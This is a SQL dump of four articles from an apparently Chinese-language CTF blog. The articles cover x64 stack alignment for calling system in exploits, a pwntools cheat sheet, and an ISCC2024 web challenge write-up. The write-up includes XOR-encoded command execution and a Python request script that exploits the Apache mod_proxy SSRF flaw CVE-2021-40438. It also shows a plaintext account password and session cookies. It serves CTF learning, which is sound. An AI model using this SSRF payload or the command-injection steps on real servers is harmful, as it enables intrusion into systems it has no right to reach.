INSERT INTO `t_article` VALUES (71, 1, 51, 'https://upload.d1lete.online/article/44d4f4c498a286111284db38dd6521fb.jpg', '栈平衡', '## 0x01 为什么执行 system 函数要栈对齐\n\n64 位 ubuntu18 以上系统调用 system 函数时是需要栈对齐的。具体一点就是 64 位下 system 函数有个 movaps 指令\n\n*MOVAPS 指令*要求数据在内存中对准 16 字节边界。如果不对准会出现分段错误\n\n如果你到 system 函数执行的时候，si 单步进去就会发现，如果没对齐的话，最后就会卡在这里（如下图）\n<img src=\"https://upload.d1lete.online/article/bc53665ff8d15a5461ac15046f8148bc.png\" />\n\n## 0x02 对齐？怎么才算对齐？\n\n因为 64 位程序的地址是 8 字节的，而十六进制又是满 16 就会进位，因此我们看到的栈地址末尾要么是 0 要么是 8\n\n<img src=\"https://upload.d1lete.online/article/9df6bfba9b7385d7b01ecdfe63c42dd4.png\"  style=\"zoom: 80%;\" />\n\n只有当地址的末尾是 0 的时候，才算是与 16 字节对齐了，如果末尾是 8 的话，那就是没有对齐。\n\n下面两个图，分别是没对齐和对齐的情况\n\n<img src=\"https://upload.d1lete.online/article/f577e8ad1467a5e398a76dec629eb21e.png\" />\n\n<img src=\"https://upload.d1lete.online/article/2906cb274fd262fa43c890f438684feb.png\" />\n\n## 0x03 如果执行 system 的时候没有对齐怎么办？\n\n将 system 函数地址+1，此处的+1，即是把地址+1，也可以理解为\n\n+1 是为了跳过一条栈操作指令\n\n（我们的目的就是跳过一条栈操作指令，使 rsp 十六字节对齐**，**跳过一条指令，自然就是把 8 变成 0 了）\n\n但又一个问题就是本来+1 是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是 mov 这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1 也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止\n\n<img src=\"https://upload.d1lete.online/article/39ade1892a4ba638c8b43ac25351a954.png\" />\n\n或者直接在调用 system 函数地址之前去调用一个 ret 指令。\n\n因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret 指令等同于 pop rip，该指令使得 rsp+8，从而完成 rsp16 字节对齐），这样 system 地址所在的栈地址就是 0 结尾，从而完成了栈对齐。\n', 1, 1, 0, 1, 1, '2024-06-05 22:07:51', NULL);
INSERT INTO `t_article` VALUES (72, 1, 51, 'https://upload.d1lete.online/article/cd212308145da3452d85ad4d5573ac17.jpg', 'Stack', '## 0x01新手村\n\n### 栈的结构\n<img src=\"https://upload.d1lete.online/article/1a6afb134d858f08d56e1bd5d9b0da47.png\"/>\n', 1, 1, 0, 1, 1, '2024-06-05 22:23:15', '2024-06-05 22:33:15');
INSERT INTO `t_article` VALUES (73, 1, 51, 'https://upload.d1lete.online/article/8fa019d1ad4910633e77f10f346aae08.jpg', 'pwntools', '### 0x01 pwtools\n\n确认你已安装 Python 和 pip。如果你还没有安装，先安装 Python 和 pip。\n\n打开终端或命令行窗口，输入以下命令安装 pwntools:\n\npip install pwntools\n\n安装完成后，您可以在 Python 脚本中导入 pwntools，例如:\n\nfrom pwn import *\n\n### 0x02 pwntools 常用模块\n\n```python\nasm                  汇编与反汇编\n\ndynelf               远程符号泄露\n\nelfelf               文件操作\n\ngdb                  启动gdb调试\n\nshellcraft           shellcode的生成器\n\ncyclic               pattern偏移字符计算\n\nprocess/remote       读写接口\n```\n\n### 0x03 数据交互\n\n```python\n\nio = remote(\'url\', port)        创建一个远程连接\n\nio = process(\"./文件名\")         创建一个本地连接\n\nio.send(\"data\")                 发送一行数据\n\nio.sendline(\"data\")             发送一行数据,并在末尾加\\n\n\nio.recv()                       接受数据\n\nio.recvline()                   接受一行数据\n\nio.interactive()                建立交互shell\n\n\nio.sendafter(b\"some_string\",data)        接收到some_string后，发送payload\n\nio.recvuntil(b\"somestring\")              接受到some_string为止\n\nio.recvuntil(b\"\\n\", drop = True)         接受到\\n为止,但不包括\\n\n\n\n```\n\n### 0x04 ELF 模块\n\n```python\nelf = ELF(\'./文件名\')\n\nelf.address                     elf 基地址\n\nelf.bss()                       elf bss 段\n\nelf.plt[\'function\']             plt[] 表项对应地址\n\nelf.got[\'function\']             got[] 表项对应地址\n\nelf.symbols[\'function\']         查看对应符号函数/数据所在地址\n\nelf.search[\'/bin/sh\']           返回一个迭代器，用next()获取\n\n```\n                                         ', 1, 1, 0, 1, 1, '2024-06-05 22:23:59', '2024-06-08 17:21:08');
INSERT INTO `t_article` VALUES (74, 1, 52, 'https://upload.d1lete.online/article/8fee7071d2e9d3ec4ddfb5b541e47552.jpg', 'ISCC2024 掉进阿帕奇的工资', '## 0x01 ISCC2024 掉进阿帕奇的工资\n\n### 0x1 获得 Manager 权限\n\n进去是一个登录界面\n\n<img src=\"https://upload.d1lete.online/article/3c0f22c51849b8ad6c1a7b49adf56c32.png\"\n/>\n\n尝试去注册一个账号(设置一个密保答案为 manager\n\n<img src=\"https://upload.d1lete.online/article/43e432029b612bcb941b84fa38d760e4.png\"\n/>\n\n通过信息重置来获得 manager\n\n<img src=\"https://upload.d1lete.online/article/eba380ba1e8fd0850e5281f548c6c6da.png\" style=\"zoom:80%;\"\n/>\n\n第一次尝试的第一个问题好像不能得到 manager\n不过尝试的第三次获得了 manager(密保问题)\n用户名:D3lete\n密码: ONVqL6Mqp4hmhpKVWvT3bEIgr9AdlI\n权限 manager\n\n<img src=\"https://upload.d1lete.online/article/9893801e541bb220d29ddba942e828d9.png\"\n/>\n\n### 0x2 然后登录成功 /gongzi_iscc.php\n\n<img src=\"https://upload.d1lete.online/article/7ce88de06dca142baf14a3c3a210da5d.png\"\nstyle=\"zoom:80%;\"\n/>\n\n### 0x3 漏洞点测试\n\n然后发现输入 ls 和 11 返回了 ]B\n推测可能是有 xor\n]B^11 = ls\n\n<img src=\"https://upload.d1lete.online/article/05f3829e24a694eaca4bcf926514ac44.png\"\n/>\n\n然后我们输入]B 11 发现了执行命令\n执行 ls 命令看当前目录下有啥(关键点 Docfile)\n<img src=\"https://upload.d1lete.online/article/0b2b684c7e34a32af63f3c6c6f1fb395.png\"\n/>\n\n继续尝试 XOR 去看 cat 一下 Docfile 里有啥\n构造一个 cat Docfile\n\n<img src=\"https://upload.d1lete.online/article/3a32c3c10d017bc396e93c36f64dc2eb.png\"\n/>\n\n带进去去执行 cat Docfile\n\n<img src=\"https://upload.d1lete.online/article/5a71eff1670035f7d29c5b19a9e810c8.png\"\n/>\n\n猜测 flag 就在http://secret.host/flag中\n\n### 0x3 获得 Flag\n\n根据 Unix:AAAA 套接字漏洞，我们打 payload 如下\n\n```python\nimport requests\nurl=\'http://101.200.138.180:60000/transfer.php?dashachun=unix:\'+\'A\'*5000+\'|http://secret.host/flag\'\ncookie={\n        \'csrftoken\':\'8vVhCkKRAMMVg5GuV0f6GW8td9uwgxjAJ7SnjgK4iZzvY7owZY7UOTqySeonjCvn\',\n        \'PHPSESSID\':\'2up1k5lc93c78uhfdgvigftih7\'\n}\nres=requests.get(url=url,cookies=cookie)\nprint(res.text)\n\n```\n\n拿到 flag\n<img src=\"https://upload.d1lete.online/article/7988297e05e3cd501f60bf04ee1b2545.png\"\n/>\n\n## 0x02 Unix:AAAA 套接字漏洞\n\nApache HTTP Server SSRF 漏洞（CVE-2021-40438）\n在其 2.4.48 及以前的版本中，mod_proxy 模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致 SSRF 漏洞\n\n[CVE-2021-40438 详细漏洞分析](https://blog.csdn.net/kali_Ma/article/details/121388165)\n', 1, 1, 0, 1, 1, '2024-06-08 16:49:31', '2024-06-08 17:17:44');
